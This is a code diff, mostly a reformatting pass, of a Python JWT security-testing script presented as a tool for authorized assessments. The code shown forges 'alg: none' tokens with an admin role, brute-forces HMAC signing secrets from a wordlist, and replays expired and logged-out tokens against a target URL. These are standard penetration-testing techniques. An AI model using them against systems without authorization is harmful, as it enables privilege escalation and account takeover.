@@ -1,17 +1,17 @@
 #!/usr/bin/env python3
 """Agent for testing JWT token security during authorized assessments."""
 
-import jwt
-import json
-import sys
-import hmac
-import hashlib
-import base64
 import argparse
-import requests
-import urllib3
+import base64
+import hashlib
+import hmac
+import json
 from datetime import datetime, timedelta, timezone
 from urllib.parse import urljoin
+
+import jwt
+import requests
+import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -55,24 +55,34 @@ def test_alg_none(token, target_url=None):
     findings = []
 
     for alg in ["none", "None", "NONE", "nOnE"]:
-        header = base64.urlsafe_b64encode(
-            json.dumps({"alg": alg, "typ": "JWT"}).encode()
-        ).rstrip(b"=").decode()
+        header = (
+            base64.urlsafe_b64encode(json.dumps({"alg": alg, "typ": "JWT"}).encode())
+            .rstrip(b"=")
+            .decode()
+        )
         payload_data["role"] = "admin"
-        payload_encoded = base64.urlsafe_b64encode(
-            json.dumps(payload_data).encode()
-        ).rstrip(b"=").decode()
+        payload_encoded = (
+            base64.urlsafe_b64encode(json.dumps(payload_data).encode()).rstrip(b"=").decode()
+        )
         forged = f"{header}.{payload_encoded}."
 
         if target_url:
             try:
-                resp = requests.get(target_url, headers={"Authorization": f"Bearer {forged}"},
-                                    timeout=10, verify=False)
+                resp = requests.get(
+                    target_url,
+                    headers={"Authorization": f"Bearer {forged}"},
+                    timeout=10,
+                    verify=True,
+                )
                 if resp.status_code == 200:
-                    findings.append({
-                        "type": "ALG_NONE", "alg_value": alg,
-                        "status": resp.status_code, "severity": "CRITICAL",
-                    })
+                    findings.append(
+                        {
+                            "type": "ALG_NONE",
+                            "alg_value": alg,
+                            "status": resp.status_code,
+                            "severity": "CRITICAL",
+                        }
+                    )
                     print(f"  [!] VULNERABLE: alg={alg} accepted (status {resp.status_code})")
                 else:
                     print(f"  [+] alg={alg} rejected (status {resp.status_code})")
@@ -99,17 +109,17 @@ def test_hmac_brute_force(token, wordlist_path):
     hash_func = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]
 
     try:
-        with open(wordlist_path, "r", errors="ignore") as f:
+        with open(wordlist_path, errors="ignore") as f:
             for i, line in enumerate(f):
                 secret = line.strip()
                 if not secret:
                     continue
                 computed = hmac.new(secret.encode(), signing_input, hash_func).digest()
                 if hmac.compare_digest(computed, signature):
-                    print(f"  [!] SECRET FOUND: '{secret}' (attempt {i+1})")
+                    print(f"  [!] SECRET FOUND: '{secret}' (attempt {i + 1})")
                     return secret
                 if (i + 1) % 10000 == 0:
-                    print(f"  [*] Tried {i+1} secrets...")
+                    print(f"  [*] Tried {i + 1} secrets...")
     except FileNotFoundError:
         print(f"  [-] Wordlist not found: {wordlist_path}")
     print("  [-] Secret not found in wordlist")
@@ -128,13 +138,14 @@ def forge_token(secret, claims, algorithm="HS256"):
 
 def test_expired_token(token, target_url):
     """Test if expired tokens are still accepted."""
-    print(f"\n[*] Testing expired token acceptance...")
+    print("\n[*] Testing expired token acceptance...")
     parts = token.split(".")
     payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
     if "exp" in payload and payload["exp"] < datetime.now(timezone.utc).timestamp():
         try:
-            resp = requests.get(target_url, headers={"Authorization": f"Bearer {token}"},
-                                timeout=10, verify=False)
+            resp = requests.get(
+                target_url, headers={"Authorization": f"Bearer {token}"}, timeout=10, verify=True
+            )
             if resp.status_code == 200:
                 print(f"  [!] VULNERABLE: Expired token accepted (status {resp.status_code})")
                 return [{"type": "EXPIRED_TOKEN_ACCEPTED", "severity": "HIGH"}]
@@ -149,20 +160,20 @@ def test_expired_token(token, target_url):
 
 def test_token_after_logout(token, target_url, logout_url):
     """Test if token is still valid after logout."""
-    print(f"\n[*] Testing token validity after logout...")
+    print("\n[*] Testing token validity after logout...")
     headers = {"Authorization": f"Bearer {token}"}
     try:
-        pre = requests.get(target_url, headers=headers, timeout=10, verify=False)
+        pre = requests.get(target_url, headers=headers, timeout=10, verify=True)
         if pre.status_code != 200:
             print("  [-] Token not valid pre-logout, skipping")
             return []
-        requests.post(logout_url, headers=headers, timeout=10, verify=False)
-        post = requests.get(target_url, headers=headers, timeout=10, verify=False)
+        requests.post(logout_url, headers=headers, timeout=10, verify=True)
+        post = requests.get(target_url, headers=headers, timeout=10, verify=True)
         if post.status_code == 200:
-            print(f"  [!] VULNERABLE: Token still valid after logout")
+            print("  [!] VULNERABLE: Token still valid after logout")
             return [{"type": "NO_TOKEN_REVOCATION", "severity": "HIGH"}]
         else:
-            print(f"  [+] Token properly revoked after logout")
+            print("  [+] Token properly revoked after logout")
     except requests.RequestException:
         pass
     return []
@@ -170,15 +181,18 @@ def test_token_after_logout(token, target_url, logout_url):
 
 def check_jwks_endpoint(base_url):
     """Check for JWKS and OpenID configuration endpoints."""
-    print(f"\n[*] Checking for JWKS/OIDC endpoints...")
+    print("\n[*] Checking for JWKS/OIDC endpoints...")
     endpoints = [
-        "/.well-known/jwks.json", "/.well-known/openid-configuration",
-        "/oauth/certs", "/auth/keys", "/.well-known/keys",
+        "/.well-known/jwks.json",
+        "/.well-known/openid-configuration",
+        "/oauth/certs",
+        "/auth/keys",
+        "/.well-known/keys",
     ]
     for ep in endpoints:
         url = urljoin(base_url, ep)
         try:
-            resp = requests.get(url, timeout=10, verify=False)
+            resp = requests.get(url, timeout=10, verify=True)
             if resp.status_code == 200:
                 print(f"  [+] Found: {ep}")
                 data = resp.json()
